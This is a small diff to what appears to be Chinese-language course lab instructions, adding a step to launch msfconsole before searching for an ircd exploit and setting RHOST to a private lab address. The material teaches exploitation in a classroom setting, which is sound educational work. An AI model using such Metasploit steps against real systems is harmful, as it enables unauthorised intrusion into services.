@@ -26,6 +26,8 @@
         (將 99999999 換成你的學號)
 
 *** 登入後指令, 參考 page 11, 12
+執行 msfconsole
+
 1. search ircd
 2. use 0
 3 set RHOST 10.0.2.6
